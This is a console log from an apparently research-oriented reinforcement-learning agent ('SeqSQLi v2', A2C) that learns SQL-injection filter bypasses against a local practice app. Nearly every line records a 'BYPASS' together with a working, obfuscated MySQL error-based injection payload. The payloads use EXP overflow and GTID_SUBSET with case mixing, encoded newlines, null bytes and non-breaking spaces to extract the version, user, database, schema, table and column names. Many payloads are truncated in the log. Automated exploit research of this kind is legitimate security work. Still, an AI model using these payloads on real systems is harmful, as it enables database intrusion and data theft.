/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  [BYPASS] Ep 10840 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELECt%0a*%0aFRom%0a(seLECt%0a((SELEct%0aJSON_ARRAYAGG(column_name)%0afroM%0aiNformATioN_sCHEma.columns%0awHerE%0aTABle_schema=DATaBA
  Ep 10840 | SR=30% | Steps=11.7 | R=-20.86
  [BYPASS] Ep 10842 | steps=7 | seq=case -> null_byte -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SElect%0a*%0aFrOm%0a(seleCT%0a((sELEct%0aJSON_ARRAYAGG(conCAT(TAbLE_schema,CHAR(46),tablE_name))%0aFROm%0aINFoRMatiON_ScHEMA.TaBlEs%0
  [BYPASS] Ep 10843 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10844 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10846 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SelEct%0a*%0aFrom%0a(SElect%0a((sELecT%0acONCat(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0afROm%0aInfORmATiOn_schEMA.tabLEs%0aw
  Ep 10850 | SR=40% | Steps=11.0 | R=-17.85
  [BYPASS] Ep 10851 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElecT%0a*%0aFrOM%0a(seLect%0a(version%a0()))a));%00
  [BYPASS] Ep 10853 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sElect%0a*%0aFrom%0a(selecT%0a((SeLect%0aconCat(CHAR(124),JSON_ARRAYAGG(TAblE_name),CHAR(124))%0aFrOM%0ainFOrmATIOn_sCHemA.TABLEs%0aw
  [BYPASS] Ep 10857 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(sElECt%0a*%0aFRom%0a(sELEcT%0a((sELEct%0aJSON_ARRAYAGG(cOncAt(TAbLE_schema,CHAR(46),TABlE_name))%0afRoM%0aiNFORMatIOn_schEMa.TablEs%0
  [BYPASS] Ep 10859 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(selEct%0a*%0afrom%0a(seLeCt%0a((sElect%0aconcAt(CHAR(124),JSON_ARRAYAGG(TABLe_name),CHAR(124))%0afrOM%0aINfOrmATiOn_ScheMA.taBles%0aW
  Ep 10860 | SR=40% | Steps=11.4 | R=-19.53
  [BYPASS] Ep 10867 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(sElECT%0a*%0aFROM%0a(sEleCT%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0ainfORmATIOn_SCheMA.schemata)))a));%00
  [BYPASS] Ep 10870 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElECT%0a*%0afRoM%0a(SElECt%0a(version%a0()))a));%00
  Ep 10870 | SR=20% | Steps=12.9 | R=-25.13
  [BYPASS] Ep 10876 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10880 | SR=10% | Steps=13.8 | R=-30.52
  [BYPASS] Ep 10882 | steps=4 | seq=null_byte -> newline -> convert_charset -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10889 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(selEcT%0a*%0aFRom%0a(SelecT%0a(DaTABase%a0()))a));%00
  Ep 10890 | SR=20% | Steps=12.8 | R=-23.40
  [BYPASS] Ep 10897 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10898 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELeCT%0a*%0aFROM%0a(sEleCt%0a((SelECt%0aJSON_ARRAYAGG(TABLe_name)%0aFrOm%0aInfORMaTiON_SChemA.tABles%0aWHerE%0atablE_schema=DaTABaSe
  [BYPASS] Ep 10899 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELEcT%0a*%0afrOm%0a(SElECT%0a((selEct%0acONCaT(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0afROM%0aiNforMATiON_sChEmA.TablEs%0aW
  [BYPASS] Ep 10900 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10900 | SR=40% | Steps=10.8 | R=-18.51
  [BYPASS] Ep 10901 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(SEleCt%0a*%0afRom%0a(sElECt%0a((sELect%0aJSON_ARRAYAGG(CONCAT(TABle_schema,CHAR(46),TaBle_name))%0aFRom%0ainfOrMatiOn_schEMa.tabLes%0
  [BYPASS] Ep 10902 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SELect%0a*%0afRoM%0a(SElEcT%0a((selECT%0acoNcaT(CHAR(124),JSON_ARRAYAGG(TAblE_name),CHAR(124))%0aFRom%0aINfOrmAtIOn_schema.tABles%0aW
  [BYPASS] Ep 10903 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SeLeCt%0a*%0aFrom%0a(selEcT%0a((sElEcT%0acoNCaT(CHAR(124),JSON_ARRAYAGG(TaBlE_name),CHAR(124))%0afRom%0ainfORMatIoN_SCHEma.tables%0aW
  [BYPASS] Ep 10908 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10910 | SR=40% | Steps=11.3 | R=-16.19
  [BYPASS] Ep 10911 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELect%0a*%0afROm%0a(sElect%0a((SEleCT%0aconCAt(CHAR(124),JSON_ARRAYAGG(tAble_name),CHAR(124))%0aFROM%0aiNfoRMAtiOn_SCheMA.TabLes%0aW
  [BYPASS] Ep 10913 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeLecT%0a*%0afrom%0a(SelEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 10914 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLEcT%0a*%0afrOm%0a(SeLeCT%0a((SElECT%0aJSON_ARRAYAGG(tAbLe_name)%0aFRoM%0ainfORmATioN_scHema.taBLEs%0aWhere%0atAblE_schema=DAtAbaSe
  [BYPASS] Ep 10918 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLect%0a*%0afRom%0a(SeLeCt%0a((sElECt%0acOnCat(CHAR(124),JSON_ARRAYAGG(TAble_name),CHAR(124))%0afRoM%0ainFOrmaTiOn_SCHemA.TabLEs%0aw
  Ep 10920 | SR=40% | Steps=11.4 | R=-17.71
  [BYPASS] Ep 10924 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElect%0a*%0aFRoM%0a(sEleCt%0a((SelEct%0aJSON_ARRAYAGG(TAblE_name)%0afROm%0ainformatiOn_scHEma.TabLes%0aWHErE%0atABlE_schema=DAtABase
  [BYPASS] Ep 10927 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10929 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELECt%0a*%0aFrOM%0a(selECt%0a((SElECT%0aJSON_ARRAYAGG(column_name)%0afROm%0aINfORMATION_sChEMA.columns%0awheRE%0aTaBlE_schema=daTaBA
  Ep 10930 | SR=30% | Steps=11.8 | R=-19.35
  [BYPASS] Ep 10936 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLeCt%0a*%0afROm%0a(SELECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10937 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10938 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElECt%0a*%0afroM%0a(seleCt%0a(DATABase%a0()))a));%00
  [BYPASS] Ep 10940 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10940 | SR=40% | Steps=10.6 | R=-15.56
  [BYPASS] Ep 10941 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SelecT%0a*%0aFrOm%0a(SElEct%0a(user%a0()))a));%00
  [BYPASS] Ep 10948 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10950 | SR=20% | Steps=12.8 | R=-25.10
  [BYPASS] Ep 10951 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(SeLEcT%0a*%0afRoM%0a(sElEcT%0a((sELEct%0aJSON_ARRAYAGG(cOncat(tABLe_schema,CHAR(46),TaBle_name))%0aFrOM%0ainFORMatiON_scHEmA.TaBlEs%0
  [BYPASS] Ep 10955 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sELect%0a*%0aFroM%0a(SELeCt%0a(user%a0()))a));%00
  [BYPASS] Ep 10957 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10960 | SR=30% | Steps=11.9 | R=-18.02
  [BYPASS] Ep 10962 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seLect%0a*%0aFRom%0a(SeleCT%0a((SELEct%0acoNcat(CHAR(124),JSON_ARRAYAGG(tABlE_name),CHAR(124))%0afRoM%0aINfOrMATIon_SChemA.TaBles%0aW
  [BYPASS] Ep 10964 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10970 | SR=20% | Steps=13.0 | R=-23.60
  [BYPASS] Ep 10973 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10979 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SElect%0a*%0afrom%0a(SELect%0a((sElEct%0aJSON_ARRAYAGG(schema_name)%0aFROM%0ainformATION_SchEma.schemata)))a));%00
  Ep 10980 | SR=20% | Steps=12.7 | R=-24.86
  [BYPASS] Ep 10984 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLect%0a*%0afrOM%0a(SelECT%0a(dATAbASe%a0()))a));%00
  [BYPASS] Ep 10986 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLECt%0a*%0aFRoM%0a(seLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 10987 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10989 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLEcT%0a*%0afROM%0a(sElEcT%0a(user%a0()))a));%00
  Ep 10990 | SR=40% | Steps=10.7 | R=-16.45
  [BYPASS] Ep 10993 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10997 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SelecT%0a*%0afrom%0a(SElEct%0a((sELect%0aJSON_ARRAYAGG(column_name)%0afROm%0aiNforMATIon_ScHeMa.columns%0aWhEre%0aTabLe_schema=DatAba
  [BYPASS] Ep 10998 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 11000 | SR=30% | Steps=11.6 | R=-19.05
  [BYPASS] Ep 11002 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELEcT%0a*%0afrom%0a(seLect%0a((SelEct%0aJSON_ARRAYAGG(column_name)%0afROM%0aiNfORMAtIOn_sChEma.columns%0awHEre%0ataBlE_schema=DatAba
  [BYPASS] Ep 11004 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selecT%0a*%0afROm%0a(SElecT%0a(user%a0()))a));%00
  [BYPASS] Ep 11005 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(selECT%0a*%0aFrom%0a(sELeCt%0a(user%a0()))a));%00
  Ep 11010 | SR=30% | Steps=12.0 | R=-21.20
  [BYPASS] Ep 11015 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sElect%0a*%0aFRom%0a(seLect%0a(DATAbaSE%a0()))a));%00
  [BYPASS] Ep 11016 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(selECT%0a*%0afRoM%0a(sELECt%0a((sElEct%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0aInFormatION_sChEMA.schemata)))a));%00
  [BYPASS] Ep 11018 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SeLEct%0a*%0afroM%0a(sEleCT%0a((SElEct%0aJSON_ARRAYAGG(coNCAT(TabLE_schema,CHAR(46),tABLE_name))%0aFRom%0ainfoRmAtiON_sChemA.tAbles%0
  Ep 11020 | SR=30% | Steps=12.0 | R=-22.66
  [BYPASS] Ep 11021 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 11022 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 11023 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 11024 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 11028 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SelEct%0a*%0aFROm%0a(sElect%0a(version%a0()))a));%00
  Ep 11030 | SR=50% | Steps=9.2 | R=-10.33
  [BYPASS] Ep 11038 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(selECT%0a*%0afRom%0a(seLeCt%0a((SeLEct%0acoNcAt(CHAR(124),JSON_ARRAYAGG(tABLe_name),CHAR(124))%0afROM%0aInfOrMatION_sCHema.TablEs%0aw
  [BYPASS] Ep 11040 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 11040 | SR=20% | Steps=13.0 | R=-26.87
  [BYPASS] Ep 11041 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeleCt%0a*%0aFroM%0a(sElECt%0a(DaTabAsE%a0()))a));%00
  [BYPASS] Ep 11042 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 11043 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 11045 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sElecT%0a*%0afRom%0a(sEleCT%0a((sELecT%0aJSON_ARRAYAGG(column_name)%0afrOm%0aInForMAtIon_SCHeMA.columns%0awHere%0aTaBle_schema=DATaBa
  [BYPASS] Ep 11049 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(sElEct%0a*%0aFrom%0a(SElEct%0a((SEleCt%0aJSON_ARRAYAGG(cONcat(taBle_schema,CHAR(46),TABLe_name))%0afrOm%0aiNForMaTiON_SCHemA.TABLes%0
  [BYPASS] Ep 11050 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELect%0a*%0afRoM%0a(seLECt%0a(version%a0()))a));%00
  Ep 11050 | SR=60% | Steps=8.7 | R=-9.05
  [BYPASS] Ep 11052 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLeCT%0a*%0afROM%0a(SeLeCT%0a((seLEct%0aJSON_ARRAYAGG(TabLe_name)%0aFrom%0aiNfORmatiOn_schemA.TABLes%0awHere%0atAble_schema=dAtabASE
  [BYPASS] Ep 11053 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(sElect%0a*%0aFRom%0a(SElECt%0a((SELeCT%0aJSON_ARRAYAGG(coNcat(TabLE_schema,CHAR(46),TaBLe_name))%0afroM%0ainfOrmATiON_scHEmA.tables%0
  [BYPASS] Ep 11055 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SeleCt%0a*%0aFrOm%0a(SeLeCt%0a((SeleCT%0aJSON_ARRAYAGG(TaBLe_name)%0aFRoM%0aiNFormATIon_ScheMA.TabLEs%0awHeRe%0atABLe_schema=datAbASE
  [BYPASS] Ep 11056 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seleCT%0a*%0aFROm%0a(SEleCT%0a((sELECT%0aJSON_ARRAYAGG(tABLE_name)%0afrom%0ainFoRMATiON_SCHeMa.taBlEs%0awHEre%0aTabLE_schema=dAtaBasE
  [BYPASS] Ep 11058 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELect%0a*%0afroM%0a(seleCT%0a((SeLECt%0acoNcAT(CHAR(124),JSON_ARRAYAGG(taBlE_name),CHAR(124))%0afrOM%0aiNFoRMATioN_SCHeMa.taBlEs%0aw
  [BYPASS] Ep 11059 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 11060 | SR=60% | Steps=9.1 | R=-9.02
  [BYPASS] Ep 11062 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sEleCT%0a*%0aFrom%0a(SeleCt%0a((SElEct%0aJSON_ARRAYAGG(TaBle_name)%0afrOm%0aiNFormATIOn_Schema.TaBLes%0awHerE%0atAble_schema=DaTABAse
  [BYPASS] Ep 11065 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sElecT%0a*%0afrOM%0a(SElEcT%0a((SelECt%0aJSON_ARRAYAGG(column_name)%0aFROM%0ainFoRMATIOn_ScHeMa.columns%0aWheRE%0atAbLE_schema=daTAbA
  Ep 11070 | SR=20% | Steps=13.0 | R=-25.09
  [BYPASS] Ep 11071 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELEct%0a*%0aFROm%0a(SeLecT%0a(version%a0()))a));%00
  [BYPASS] Ep 11073 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(sEleCT%0a*%0aFrom%0a(seLECT%0a((SelecT%0aJSON_ARRAYAGG(coNcAt(TABle_schema,CHAR(46),TaBlE_name))%0afrom%0aINfORmATIoN_ScHEma.taBLEs%0
  [BYPASS] Ep 11074 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SelEcT%0a*%0aFrom%0a(seLect%0a((SElecT%0acoNcat(CHAR(124),JSON_ARRAYAGG(taBLE_name),CHAR(124))%0aFRom%0ainforMation_ScHEMA.TabLEs%0aw
  [BYPASS] Ep 11075 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 11078 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElecT%0a*%0aFrOm%0a(seLecT%0a(databAsE%a0()))a));%00
  Ep 11080 | SR=50% | Steps=10.1 | R=-13.32
  [BYPASS] Ep 11083 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SElect%0a*%0afrOM%0a(sElECt%0a(DataBase%a0()))a));%00
  [BYPASS] Ep 11084 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 11087 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 11090 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLEcT%0a*%0afRom%0a(SeLeCt%0a((sELect%0aConcaT(CHAR(124),JSON_ARRAYAGG(tabLe_name),CHAR(124))%0afrom%0aiNfoRMatIOn_SChEmA.tabLEs%0aW
  Ep 11090 | SR=40% | Steps=10.9 | R=-13.79
  [BYPASS] Ep 11095 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 11100 | SR=10% | Steps=13.8 | R=-28.32
  [BYPASS] Ep 11101 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SElECt%0a*%0afRom%0a(seLEct%0a((SELECt%0aJSON_ARRAYAGG(cOncat(TaBlE_schema,CHAR(46),TAble_name))%0afRoM%0aInfOrMaTiON_ScHEmA.tABles%0
  [BYPASS] Ep 11102 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(selEcT%0a*%0aFRom%0a(SElECt%0a(user%a0()))a));%00
  [BYPASS] Ep 11103 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 11109 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 11110 | SR=40% | Steps=10.7 | R=-16.68
  [BYPASS] Ep 11113 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SElECt%0a*%0aFrom%0a(SELEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 11114 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 11118 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SeleCT%0a*%0aFRom%0a(sELECt%0a((SElEct%0aJSON_ARRAYAGG(CoNcaT(TAbLE_schema,CHAR(46),tablE_name))%0aFRoM%0ainfOrMation_ScHEma.tablEs%0
  [BYPASS] Ep 11120 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 11120 | SR=40% | Steps=10.7 | R=-13.90
  [BYPASS] Ep 11121 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 11123 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELECt%0a*%0aFrOm%0a(seleCT%0a((SELECt%0acOnCat(CHAR(124),JSON_ARRAYAGG(TABle_name),CHAR(124))%0aFROM%0aInFoRmAtIon_SCHemA.TAbLes%0aW
  [BYPASS] Ep 11130 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SElect%0a*%0aFrOm%0a(sEleCt%0a(DatABaSe%a0()))a));%00
